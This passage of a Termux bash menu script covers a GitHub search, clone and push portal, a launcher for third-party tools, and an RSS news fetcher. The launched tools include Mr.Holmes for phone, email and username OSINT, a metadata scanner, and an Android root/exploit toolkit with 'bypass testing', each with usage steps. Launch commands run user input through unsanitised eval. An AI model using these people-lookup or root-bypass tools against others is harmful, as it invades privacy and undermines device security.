            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done
}

#  [19] GITHUB PORTAL
# ═══════════════════════════════════════════════════════════════════

github_portal() {
    local GHTOKEN=""
    local GHTOKEN_FILE=~/.fezzy_ghtoken
    [[ -f "$GHTOKEN_FILE" ]] && GHTOKEN=$(cat "$GHTOKEN_FILE")

    _gh_api() {
        local endpoint="$1"
        if [[ -n "$GHTOKEN" ]]; then
            curl -s -H "Authorization: token $GHTOKEN" "https://api.github.com/$endpoint"
        else
            curl -s "https://api.github.com/$endpoint"
        fi
    }

    while true; do
        clear
        echo ""
        _dv19
        printf "  ${C19}${BOLD}GITHUB PORTAL  —  Search · Clone · Manage · philfesters  ${RESET}\n"
        _dv19
        echo ""
        printf "  ${WH}GitHub API · git · curl · ~/storage/downloads/github_repos${RESET}\n"
        printf "  ${FADE}■ Every tool you need lives in a repo · search it · clone it · own it · 999${RESET}\n"
        echo ""
        [[ -n "$GHTOKEN" ]] && \
            printf "  ${GRN}[✓] Token loaded${RESET}\n\n" || \
            printf "  ${YEL}[!] No token — read-only mode (set token in [9])${RESET}\n\n"
        _dv19
        echo ""
        printf "  ${C19}${BOLD}── SEARCH & DISCOVER ──────────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[1]  Search repos       — keyword search across all of GitHub            ${RESET}\n"
        printf "  ${WH}[2]  Search hacker tools — security / OSINT / Termux tools only          ${RESET}\n"
        printf "  ${WH}[3]  Trending today      — most starred repos right now                   ${RESET}\n"
        printf "  ${WH}[4]  Search by topic     — find repos tagged with any topic               ${RESET}\n"
        printf "  ${WH}[5]  Search by language  — filter repos by coding language                ${RESET}\n"
        echo ""
        printf "  ${C19}${BOLD}── YOUR REPOS (philfesters) ───────────────────────────────────────${RESET}\n"
        printf "  ${WH}[6]  My repos          — list all philfesters repositories                ${RESET}\n"
        printf "  ${WH}[7]  Clone my repo     — clone any philfesters repo to $GITDIR      ${RESET}\n"
        printf "  ${WH}[8]  Push changes      — git add + commit + push from any local repo      ${RESET}\n"
        printf "  ${WH}[9]  Set GitHub token  — save token for push/private access               ${RESET}\n"
        echo ""
        printf "  ${C19}${BOLD}── REPO TOOLS ─────────────────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[10] Clone any repo    — paste any GitHub URL and clone it                ${RESET}\n"
        printf "  ${WH}[11] View README       — fetch and display README.md from any repo        ${RESET}\n"
        printf "  ${WH}[12] Repo info         — stars, forks, language, description              ${RESET}\n"
        printf "  ${WH}[13] Browse cloned     — list repos in $GITDIR                       ${RESET}\n"
        printf "  ${WH}[14] Pull latest       — git pull on any cloned repo                      ${RESET}\n"
        printf "  ${WH}[15] Install git       — pkg install git                                  ${RESET}\n"
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu${RESET}\n"
        echo ""
        _dv19
        echo ""
        _hover_hint "github"
        echo ""
        printf "  ${C19}${BOLD}Choice » ${RESET}"
        read -r ch

        case "$ch" in
            1)
                echo ""; printf "  ${WH}Search GitHub repos: ${RESET}"; read -r query
                [[ -z "$query" ]] && continue
                local q; q=$(echo "$query" | sed 's/ /+/g')
                echo ""
                printf "  ${C19}[*] Searching GitHub for: %s${RESET}\n\n" "$query"
                local res; res=$(_gh_api "search/repositories?q=$q&sort=stars&order=desc&per_page=10")
                echo "$res" | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    items=d.get('items',[])
    for i,r in enumerate(items,1):
        print(f\"  \033[38;5;45m{i:2}.\033[0m \033[97m{r['full_name']}\033[0m\")
        print(f\"      \033[38;5;238mStars: {r['stargazers_count']}  |  {r.get('description','No description')[:60]}\033[0m\")
        print(f\"      \033[38;5;238m{r['html_url']}\033[0m\")
        print()
except: print('  API error — check connection')
" 2>/dev/null
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            2)
                echo ""; printf "  ${WH}Tool keyword (e.g. osint, termux, hacking): ${RESET}"; read -r query
                [[ -z "$query" ]] && continue
                local q; q=$(echo "$query osint termux security" | sed 's/ /+/g')
                echo ""
                printf "  ${C19}[*] Searching hacker tools: %s${RESET}\n\n" "$query"
                local res; res=$(_gh_api "search/repositories?q=$q&sort=stars&order=desc&per_page=10")
                echo "$res" | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    items=d.get('items',[])
    for i,r in enumerate(items,1):
        print(f\"  \033[38;5;45m{i:2}.\033[0m \033[97m{r['full_name']}\033[0m\")
        print(f\"      \033[38;5;238mStars: {r['stargazers_count']}  |  {r.get('description','No description')[:60]}\033[0m\")
        print(f\"      \033[38;5;238mClone: git clone {r['clone_url']}\033[0m\")
        print()
except: print('  API error')
" 2>/dev/null
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            3)
                echo ""
                printf "  ${C19}[*] Fetching trending repos...${RESET}\n\n"
                local res; res=$(_gh_api "search/repositories?q=created:>$(date -d '7 days ago' '+%Y-%m-%d' 2>/dev/null || date -v-7d '+%Y-%m-%d' 2>/dev/null || echo '2025-01-01')&sort=stars&order=desc&per_page=10")
                echo "$res" | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    items=d.get('items',[])
    for i,r in enumerate(items,1):
        print(f\"  \033[38;5;45m{i:2}.\033[0m \033[97m{r['full_name']}\033[0m  \033[38;5;226m★ {r['stargazers_count']}\033[0m\")
        print(f\"      \033[38;5;238m{r.get('description','No description')[:65]}\033[0m\")
        print()
except: print('  API error')
" 2>/dev/null
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            4)
                echo ""; printf "  ${WH}Topic (e.g. termux, android, osint, python): ${RESET}"; read -r topic
                [[ -z "$topic" ]] && continue
                echo ""
                printf "  ${C19}[*] Repos tagged: %s${RESET}\n\n" "$topic"
                local res; res=$(_gh_api "search/repositories?q=topic:$topic&sort=stars&order=desc&per_page=10")
                echo "$res" | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    items=d.get('items',[])
    for i,r in enumerate(items,1):
        print(f\"  \033[38;5;45m{i:2}.\033[0m \033[97m{r['full_name']}\033[0m  \033[38;5;226m★ {r['stargazers_count']}\033[0m\")
        print(f\"      \033[38;5;238m{r.get('description','No description')[:65]}\033[0m\")
        print()
except: print('  API error')
" 2>/dev/null
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            5)
                echo ""; printf "  ${WH}Language (e.g. python, bash, javascript): ${RESET}"; read -r lang
                echo ""; printf "  ${WH}Keyword (optional): ${RESET}"; read -r kw
                [[ -z "$lang" ]] && continue
                local q="language:$lang"
                [[ -n "$kw" ]] && q="$kw+language:$lang"
                echo ""
                printf "  ${C19}[*] Top %s repos...${RESET}\n\n" "$lang"
                local res; res=$(_gh_api "search/repositories?q=$q&sort=stars&order=desc&per_page=10")
                echo "$res" | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    items=d.get('items',[])
    for i,r in enumerate(items,1):
        print(f\"  \033[38;5;45m{i:2}.\033[0m \033[97m{r['full_name']}\033[0m  \033[38;5;226m★ {r['stargazers_count']}\033[0m\")
        print(f\"      \033[38;5;238m{r.get('description','No description')[:65]}\033[0m\")
        print()
except: print('  API error')
" 2>/dev/null
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            6)
                echo ""
                printf "  ${C19}[*] philfesters repositories...${RESET}\n\n"
                local res; res=$(_gh_api "users/philfesters/repos?sort=updated&per_page=30")
                echo "$res" | python3 -c "
import sys,json
try:
    repos=json.load(sys.stdin)
    if isinstance(repos,list):
        for i,r in enumerate(repos,1):
            priv='[private]' if r.get('private') else '[public]'
            print(f\"  \033[38;5;45m{i:2}.\033[0m \033[97m{r['name']}\033[0m  \033[38;5;238m{priv}\033[0m\")
            print(f\"      \033[38;5;238m{r.get('description') or 'No description'}\033[0m\")
            print(f\"      \033[38;5;238mStars: {r['stargazers_count']}  Updated: {r['updated_at'][:10]}\033[0m\")
            print()
    else:
        print('  No repos found or API limit hit')
except Exception as e: print(f'  Error: {e}')
" 2>/dev/null
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            7)
                echo ""
                printf "  ${C19}[*] philfesters repos — enter number to clone:${RESET}\n\n"
                local res; res=$(_gh_api "users/philfesters/repos?sort=updated&per_page=30")
                echo "$res" | python3 -c "
import sys,json
repos=json.load(sys.stdin)
for i,r in enumerate(repos,1):
    print(f'  {i:2}. {r[\"name\"]}')
" 2>/dev/null
                echo ""
                printf "  ${WH}Number to clone: ${RESET}"; read -r rnum
                [[ -z "$rnum" ]] && continue
                local rname; rname=$(echo "$res" | python3 -c "
import sys,json
repos=json.load(sys.stdin)
idx=int('$rnum')-1
if 0<=idx<len(repos): print(repos[idx]['clone_url'])
" 2>/dev/null)
                [[ -z "$rname" ]] && { printf "  ${RED}Invalid${RESET}\n"; sleep 1; continue; }
                mkdir -p "$GITDIR"
                echo ""
                printf "  ${C19}[*] Cloning %s...${RESET}\n\n" "$rname"
                git clone "$rname" "$GITDIR/$(basename "${rname%.git}")"
                printf "\n  ${GRN}✓ Cloned to %s${RESET}\n" "$GITDIR"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            8)
                echo ""; printf "  ${WH}Path to local repo (or ENTER for current dir): ${RESET}"; read -r rpath
                [[ -z "$rpath" ]] && rpath="."
                rpath=$(_xpath "$rpath")
                [[ ! -d "$rpath/.git" ]] && { printf "  ${RED}Not a git repo${RESET}\n"; sleep 1; continue; }
                echo ""; printf "  ${WH}Commit message: ${RESET}"; read -r msg
                [[ -z "$msg" ]] && msg="Fezzy Station update — $(date '+%Y-%m-%d %H:%M')"
                echo ""
                printf "  ${C19}[*] Pushing %s...${RESET}\n\n" "$rpath"
                cd "$rpath" || continue
                git add -A
                git commit -m "$msg"
                if [[ -n "$GHTOKEN" ]]; then
                    local remote; remote=$(git remote get-url origin 2>/dev/null)
                    local authed; authed=$(echo "$remote" | sed "s|https://|https://$GHTOKEN@|")
                    git push "$authed" 2>/dev/null || git push origin
                else
                    git push origin
                fi
                cd - >/dev/null
                printf "\n  ${GRN}✓ Pushed${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            9)
                echo ""
                printf "  ${WH}Paste your GitHub personal access token (hidden):${RESET}\n"
                printf "  ${FADE}Get one at: github.com → Settings → Developer settings → Tokens${RESET}\n\n"
                printf "  ${WH}Token: ${RESET}"; read -rs tok; echo ""
                [[ -z "$tok" ]] && continue
                echo "$tok" > "$GHTOKEN_FILE"
                chmod 600 "$GHTOKEN_FILE"
                GHTOKEN="$tok"
                printf "  ${GRN}✓ Token saved to %s${RESET}\n" "$GHTOKEN_FILE"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            10)
                echo ""; printf "  ${WH}GitHub URL to clone: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                mkdir -p "$GITDIR"
                echo ""
                printf "  ${C19}[*] Cloning %s...${RESET}\n\n" "$url"
                git clone "$url" "$GITDIR/$(basename "${url%.git}")"
                printf "\n  ${GRN}✓ Cloned to %s${RESET}\n" "$GITDIR"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            11)
                echo ""; printf "  ${WH}Owner/repo (e.g. s0md3v/Photon): ${RESET}"; read -r repo
                [[ -z "$repo" ]] && continue
                echo ""
                printf "  ${C19}[*] README for %s:${RESET}\n\n" "$repo"
                local rdme; rdme=$(_gh_api "repos/$repo/readme")
                echo "$rdme" | python3 -c "
import sys,json,base64
try:
    d=json.load(sys.stdin)
    content=base64.b64decode(d['content']).decode('utf-8',errors='replace')
    lines=content.split('\n')[:60]
    for l in lines: print('  '+l)
except: print('  README not found or API error')
" 2>/dev/null | less -R
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            12)
                echo ""; printf "  ${WH}Owner/repo (e.g. philfesters/fezzy-portal): ${RESET}"; read -r repo
                [[ -z "$repo" ]] && continue
                echo ""
                local res; res=$(_gh_api "repos/$repo")
                echo "$res" | python3 -c "
import sys,json
try:
    r=json.load(sys.stdin)
    print(f\"  Name        : {r.get('full_name','?')}\")
    print(f\"  Description : {r.get('description','none')}\")
    print(f\"  Language    : {r.get('language','?')}\")
    print(f\"  Stars       : {r.get('stargazers_count','?')}\")
    print(f\"  Forks       : {r.get('forks_count','?')}\")
    print(f\"  Open Issues : {r.get('open_issues_count','?')}\")
    print(f\"  Created     : {r.get('created_at','?')[:10]}\")
    print(f\"  Updated     : {r.get('updated_at','?')[:10]}\")
    print(f\"  Clone URL   : {r.get('clone_url','?')}\")
    print(f\"  Website     : {r.get('homepage') or 'none'}\")
    print(f\"  License     : {(r.get('license') or {}).get('name','none')}\")
except: print('  Repo not found or API error')
" 2>/dev/null
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            13)
                echo ""
                printf "  ${C19}[CLONED REPOS]${RESET} ${WH}%s${RESET}\n\n" "$GITDIR"
                local count; count=$(find "$GITDIR" -maxdepth 1 -mindepth 1 -type d 2>/dev/null | wc -l)
                printf "  ${WH}%s repo(s) cloned:${RESET}\n\n" "$count"
                find "$GITDIR" -maxdepth 1 -mindepth 1 -type d 2>/dev/null | while read -r d; do
                    local branch; branch=$(git -C "$d" branch --show-current 2>/dev/null || echo "?")
                    local last; last=$(git -C "$d" log -1 --format="%ar" 2>/dev/null || echo "?")
                    printf "  ${C19}●${RESET} %-30s ${FADE}branch: %s · last commit: %s${RESET}\n" "$(basename "$d")" "$branch" "$last"
                done
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            14)
                echo ""; printf "  ${WH}Repo folder name in %s: ${RESET}" "$GITDIR"; read -r rname
                [[ -z "$rname" ]] && continue
                local rpath="$GITDIR/$rname"
                [[ ! -d "$rpath" ]] && { printf "  ${RED}Not found in %s${RESET}\n" "$GITDIR"; sleep 1; continue; }
                echo ""
                printf "  ${C19}[*] git pull on %s...${RESET}\n\n" "$rname"
                git -C "$rpath" pull
                printf "\n  ${GRN}✓ Up to date${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            15)
                echo ""
                printf "  ${C19}[INSTALL]${RESET} ${WH}git${RESET}\n\n"
                pkg install git -y
                printf "  ${GRN}✓ git installed${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            b|B) return 0 ;;
            m|M) media_station_portal; return ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done
}


# ═══════════════════════════════════════════════════════════════════
#  FEZZY STUDIO — Curated Tool Installer & Launcher
# ═══════════════════════════════════════════════════════════════════

fezzy_studio() {
    local STUDIO="$STUDIODIR"

    _studio_tool() {
        # $1=name $2=repo_url $3=clone_flags $4=install_note $5=synopsis $6=launch $7=how_to_use
        local tname="$1" turl="$2" tflags="$3" tnote="$4" tsyn="$5" tlaunch="$6" thow="$7"
        local tdir="$STUDIO/$(basename "${turl%.git}")"

        while true; do
            clear
            echo ""
            _dv20
            printf "  ${C20}${BOLD}FEZZY STUDIO  —  %s${RESET}\n" "$tname"
            _dv20
            echo ""
            printf "  ${FADE}%s${RESET}\n" "$tsyn"
            echo ""
            [[ -d "$tdir" ]] && printf "  ${GRN}[✓] Cloned at: %s${RESET}\n\n" "$tdir" \
                             || printf "  ${YEL}[!] Not cloned yet — use [1] to install${RESET}\n\n"
            _dv20
            echo ""
            printf "  ${WH}[1]  Install / Clone                                               ${RESET}\n"
            printf "  ${WH}[2]  Synopsis                                                       ${RESET}\n"
            printf "  ${WH}[3]  Launch                                                         ${RESET}\n"
            printf "  ${WH}[4]  How to Use                                                     ${RESET}\n"
            printf "  ${WH}[5]  Update (git pull)                                              ${RESET}\n"
            echo ""
            printf "  ${FADE}[b] Back${RESET}\n"
            echo ""
            _dv20
            echo ""
            _hover_hint "fezzysec"
        echo ""
        printf "  ${C20}${BOLD}Choice » ${RESET}"
            read -r stch

            case "$stch" in
                1)
                    echo ""
                    if [[ -d "$tdir" ]]; then
                        printf "  ${YEL}[!] Already cloned at %s${RESET}\n" "$tdir"
                        printf "  ${WH}Re-clone? [y/n]: ${RESET}"; read -r reclone
                        [[ "$reclone" != "y" && "$reclone" != "Y" ]] && continue
                        rm -rf "$tdir" 2>/dev/null
                    fi
                    mkdir -p "$STUDIO"
                    printf "  ${C20}[*] Cloning %s...${RESET}\n\n" "$tname"
                    git clone $tflags "$turl" "$tdir"
                    if [[ $? -eq 0 ]]; then
                        printf "\n  ${GRN}✓ Cloned to %s${RESET}\n" "$tdir"
                        [[ -n "$tnote" ]] && echo "" && printf "%s\n" "$tnote" | sed 's/^/  /'
                    else
                        printf "\n  ${RED}✗ Clone failed — check connection${RESET}\n"
                    fi
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                2)
                    echo ""
                    _dv20
                    printf "  ${C20}${BOLD}SYNOPSIS — %s${RESET}\n" "$tname"
                    _dv20
                    echo ""
                    printf "%s\n" "$tsyn" | sed 's/^/  /'
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                3)
                    echo ""
                    if [[ ! -d "$tdir" ]]; then
                        printf "  ${RED}Not cloned — run [1] Install first${RESET}\n"; sleep 1; continue
                    fi
                    printf "  ${C20}[*] Launching %s...${RESET}\n\n" "$tname"
                    cd "$tdir" 2>/dev/null || true
                    eval "$tlaunch" 2>/dev/null || printf "  ${RED}Launch failed — see [4] How to Use${RESET}\n"
                    cd - >/dev/null 2>/dev/null || true
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                4)
                    echo ""
                    _dv20
                    printf "  ${C20}${BOLD}HOW TO USE — %s${RESET}\n" "$tname"
                    _dv20
                    echo ""
                    printf "%s\n" "$thow" | sed 's/^/  /'
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                5)
                    echo ""
                    if [[ ! -d "$tdir/.git" ]]; then
                        printf "  ${RED}Not a git repo — re-clone with [1]${RESET}\n"; sleep 1; continue
                    fi
                    printf "  ${C20}[*] Updating %s...${RESET}\n\n" "$tname"
                    git -C "$tdir" pull
                    printf "\n  ${GRN}✓ Done${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                b|B) return 0 ;;
                *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
            esac
        done
    }

    while true; do
        clear
        echo ""
        _dv20
        printf "  ${C20}${BOLD}FEZZY STUDIO  —  Curated Tool Installer & Launcher${RESET}\n"
        _dv20
        echo ""
        printf "  ${WH}%s${RESET}\n" "$STUDIO"
        printf "  ${FADE}■ Clone · Inspect · Launch · Update · every tool with full how-to · 999${RESET}\n"
        echo ""
        _dv20
        echo ""
        printf "  ${C20}${BOLD}── DESKTOP & UI ────────────────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[1]  Termux Desktop    — XFCE4 desktop environment for Termux          ${RESET}\n"
        echo ""
        printf "  ${C20}${BOLD}── OSINT & RECON ───────────────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[2]  SMWYG             — Show Me What You Got · metadata OSINT scanner  ${RESET}\n"
        printf "  ${WH}[3]  Mr.Holmes         — phone/email/username OSINT framework           ${RESET}\n"
        echo ""
        printf "  ${C20}${BOLD}── EXPLOIT & PENTEST ───────────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[4]  Root Toolkit       — Android root/exploit companion (educational)   ${RESET}\n"
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu${RESET}\n"
        echo ""
        _dv20
        echo ""
        printf "  ${C20}${BOLD}Studio » ${RESET}"
        read -r stmch

        case "$stmch" in
            1)
                _studio_tool \
                    "TERMUX DESKTOP — adi1090x" \
                    "https://github.com/adi1090x/termux-desktop" \
                    "--depth=1" \
                    "POST-INSTALL STEPS:
  cd ~/storage/downloads/fezzy_studio/termux-desktop
  chmod +x setup.sh
  bash setup.sh
  (Follow prompts — installs XFCE4 + VNC + themes)

  After install:
  vncserver :1
  Connect bVNC: 127.0.0.1 port 5901
  In desktop terminal: xfce4-session" \
                    "Termux Desktop by adi1090x transforms your Termux into a full
graphical XFCE4 desktop environment.

WHAT IT DOES:
  Installs XFCE4 window manager + panel
  Sets up VNCserver (TigerVNC)
  Applies custom themes, icons, wallpapers
  Provides a full Linux desktop on Android

REPO: github.com/adi1090x/termux-desktop" \
                    "bash setup.sh" \
                    "INSTALLATION:
  1. Clone via [1] Install
  2. cd into the folder
  3. Run: bash setup.sh
  4. Follow on-screen prompts

LAUNCHING VNC:
  vncserver :1
  (or) vncserver -localhost :1
  Connect bVNC app → 127.0.0.1 → Port 5901

STARTING DESKTOP:
  Inside bVNC terminal: xfce4-session

IF STUCK (lock files):
  rm /data/data/com.termux/files/usr/tmp/.X1-lock
  rm /data/data/com.termux/files/usr/tmp/.X11-unix/X1
  Then retry: vncserver :1

STOP VNC:
  vncserver -kill :1

TIPS:
  Use bVNC Free app from F-Droid
  Set colour depth to 24-bit for best performance
  XFCE4 is lightweight — ideal for Android" ;;
            2)
                _studio_tool \
                    "SMWYG — Show Me What You Got" \
                    "https://github.com/Viralmaniar/SMWYG-Show-Me-What-You-Got" \
                    "" \
                    "POST-INSTALL:
  cd ~/storage/downloads/fezzy_studio/SMWYG-Show-Me-What-You-Got
  pip install -r requirements.txt --break-system-packages" \
                    "SMWYG (Show Me What You Got) is a metadata and OSINT extraction
tool that analyses files, images and documents for hidden data.

WHAT IT FINDS:
  EXIF data from images (GPS, camera model, date)
  Document metadata (author, software, edits)
  Email headers and origin data
  Hidden strings inside files

REPO: github.com/Viralmaniar/SMWYG-Show-Me-What-You-Got" \
                    "python3 smwyg.py" \
                    "BASIC USAGE:
  python3 smwyg.py

COMMON WORKFLOWS:
  Analyse image EXIF:
    python3 smwyg.py -f photo.jpg

  Analyse document:
    python3 smwyg.py -f document.docx

  Scan a URL for metadata:
    python3 smwyg.py -u https://target.com/image.jpg

INSTALL DEPS:
  pip install -r requirements.txt --break-system-packages

TIPS:
  Works on jpg, png, pdf, docx files
  GPS coords from photos can reveal locations
  Author fields in docs reveal real usernames
  Always use on files you are authorised to inspect" ;;
            3)
                _studio_tool \
                    "MR.HOLMES — Phone/Email/Username OSINT" \
                    "https://github.com/Lucksi/Mr.Holmes" \
                    "" \
                    "POST-INSTALL:
  cd ~/storage/downloads/fezzy_studio/Mr.Holmes
  sudo apt-get update 2>/dev/null || pkg update -y
  pip install -r requirements.txt --break-system-packages 2>/dev/null" \
                    "Mr.Holmes is an OSINT framework for investigating phone numbers,
email addresses and usernames.

WHAT IT DOES:
  Phone number lookup (carrier, country, line type)
  Email reputation and breach check
  Username search across platforms
  Social media profile discovery

REPO: github.com/Lucksi/Mr.Holmes" \
                    "python3 MrHolmes.py" \
                    "BASIC USAGE:
  python3 MrHolmes.py

MENU OPTIONS (inside MrHolmes):
  [1] Phone number OSINT
      Enter number with country code: +27831234567
  [2] Email OSINT
      Enter email address to investigate
  [3] Username lookup
      Enter username to search

INSTALL STEPS:
  1. Clone with [1] Install
  2. pkg update -y
  3. pip install -r requirements.txt --break-system-packages
  4. Launch with [3]

PHONE FORMAT:
  Always include country code: +27 for South Africa
  +27 83 123 4567 → +27831234567

TIPS:
  Results show carrier, location, VOIP/mobile status
  Email check shows if address appears in known breaches
  Run as your own number first to test output" ;;
            4)
                _studio_tool \
                    "ROOT TOOLKIT — adarshaddee" \
                    "https://github.com/adarshaddee/root" \
                    "" \
                    "POST-INSTALL:
  cd ~/storage/downloads/fezzy_studio/root
  chmod +x main" \
                    "Educational Android root and system toolkit.

WHAT IT DOES:
  System information gathering
  Android exploit reference scripts
  Root detection and bypass testing
  Device info and partition listing

REPO: github.com/adarshaddee/root
USE ON DEVICES YOU OWN ONLY" \
                    "chmod +x main && ./main" \
                    "INSTALLATION:
  1. Clone via [1] Install
  2. cd ~/storage/downloads/fezzy_studio/root
  3. chmod +x main
  4. ./main

USAGE:
  ./main
  Follow on-screen menu options

IMPORTANT:
  Use only on devices you own or have permission
  Educational purposes — understand your own device
  Some features require a rooted device
  Rootless Termux (your setup) = limited features

WHAT WORKS WITHOUT ROOT:
  Device info collection
  Partition listing
  System property reads

TIPS:
  Read the README inside the cloned folder
  cat README.md | less
  Some scripts need Python: pkg install python -y" ;;
            b|B) return 0 ;;
            m|M) media_station_portal; return ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done
}



_fsec_tool_menu() {
    local tool_name="$1"
    local tool_desc="$2"
    local launch_cmd="$3"
    local update_cmd="$4"
    local how_to_use="$5"
    local tool_dir="$6"

    while true; do
        clear
        echo ""
        _dv20
        printf "  ${C20}${BOLD}%s${RESET}\n" "$tool_name"
        _dv20
        echo ""
        printf "  ${FADE}%s${RESET}\n" "$tool_desc"
        echo ""
        _dv20
        echo ""
        printf "  ${WH}[1] How to Use\n"
        printf "  [2] Launch Tool\n"
        printf "  [3] Update Tool\n"
        printf "  [4] Save Output to File\n"
        printf "  [b] Back${RESET}\n"
        echo ""
        _dv20
        echo ""
        _hover_hint "fezzysec"
        echo ""
        printf "  ${C20}${BOLD}Choice » ${RESET}"
        read -r tch

        case "$tch" in
            1)
                echo ""
                _dv20
                printf "  ${C20}${BOLD}HOW TO USE — %s${RESET}\n" "$tool_name"
                _dv20
                echo ""
                printf "%s\n" "$how_to_use" | sed 's/^/  /'
                echo ""
                printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            2)
                echo ""
                printf "  ${C20}[*] Launching %s...${RESET}\n\n" "$tool_name"
                if [[ -n "$tool_dir" ]]; then
                    cd "$tool_dir" 2>/dev/null || true
                fi
                printf "  ${WH}Input (or ENTER for interactive mode): ${RESET}"; read -r tool_input
                echo ""
                if [[ -n "$tool_input" ]]; then
                    eval "$launch_cmd \"$tool_input\"" 2>/dev/null || eval "$launch_cmd $tool_input"
                else
                    eval "$launch_cmd" 2>/dev/null
                fi
                if [[ -n "$tool_dir" ]]; then cd - >/dev/null 2>/dev/null || true; fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            3)
                echo ""
                printf "  ${C20}[*] Updating %s...${RESET}\n\n" "$tool_name"
                if [[ -n "$tool_dir" ]]; then
                    cd "$tool_dir" 2>/dev/null || true
                    git pull 2>/dev/null && printf "  ${GRN}✓ Updated via git pull${RESET}\n" || \
                        printf "  ${YEL}git pull failed — trying pip...${RESET}\n"
                fi
                [[ -n "$update_cmd" ]] && eval "$update_cmd" && printf "  ${GRN}✓ Update complete${RESET}\n"
                if [[ -n "$tool_dir" ]]; then cd - >/dev/null 2>/dev/null || true; fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            4)
                echo ""
                printf "  ${WH}Input for %s: ${RESET}" "$tool_name"; read -r tool_input
                [[ -z "$tool_input" ]] && { printf "  ${RED}No input${RESET}\n"; sleep 1; continue; }
                local outfile="$FSECDIR/${tool_name// /_}_$(date +%Y%m%d_%H%M%S).txt"
                echo ""
                printf "  ${C20}[*] Running and saving output...${RESET}\n\n"
                if [[ -n "$tool_dir" ]]; then cd "$tool_dir" 2>/dev/null || true; fi
                eval "$launch_cmd \"$tool_input\"" 2>/dev/null | tee "$outfile"
                if [[ -n "$tool_dir" ]]; then cd - >/dev/null 2>/dev/null || true; fi
                printf "\n  ${GRN}✓ Saved → %s${RESET}\n" "$outfile"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            b|B) return 0 ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done
}

news_portal() {
    local NEWSDIR="${NEWSDIR:-$HOME/storage/downloads/fezzy_news}"
    mkdir -p "$NEWSDIR" 2>/dev/null
    # Helper: fetch RSS, show numbered list, open article in w3m
    _news_fetch() {
        local name="$1" url="$2" limit="${3:-8}"
        echo ""
        printf "  ${C20}[ %s ]${RESET}\n\n" "$name"

        # Spinner while fetching
        local raw="" done_flag=0
        (
            local sp='-\|/' i=0
            while [[ $done_flag -eq 0 ]]; do
                printf "\r  ${FADE}Fetching... ${sp:i++%4:1}${RESET}"
                sleep 0.12
            done
        ) &
        local spin_pid=$!

        raw=$(curl -sL --max-time 10 \
            -H "User-Agent: Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0" \
            -H "Accept: application/rss+xml, application/xml, text/xml, */*" \
            --cookie "$FEZZY_COOKIES" --cookie-jar "$FEZZY_COOKIES" \
            "$url" 2>/dev/null \
            | sed 's/></>\n</g')
        sleep $((RANDOM % 3 + 1))
        kill "$spin_pid" 2>/dev/null
        wait "$spin_pid" 2>/dev/null
        printf "\r  ${FADE}                    ${RESET}\r"

        if [[ -z "$raw" ]]; then
            printf "  ${RED}No data — check connection or feed URL changed${RESET}\n"
            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
            return
        fi

        # Parse titles and links from raw RSS
        mapfile -t _titles < <(echo "$raw" \
            | grep -o '<title>[^<]*</title>' \
            | sed 's/<title>//g; s/<\/title>//g; s/&amp;/\&/g; s/&#39;/'"'"'/g; s/&lt;/</g; s/&gt;/>/g' \
            | grep -v "^[[:space:]]*$" | tail -n +2 | head -n "$limit")
        mapfile -t _links  < <(echo "$raw" \
            | grep -o '<link>[^<]*</link>\|<link/>\|<link [^>]*>' \
            | sed 's/<link>//g; s/<\/link>//g; s/<link[^>]*>//g' \
            | grep "^http" | head -n "$limit")

        if [[ ${#_titles[@]} -eq 0 ]]; then
            printf "  ${RED}No articles parsed — feed format may have changed${RESET}\n"
            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
            return
        fi

        # Display numbered list
        local i
        for i in "${!_titles[@]}"; do
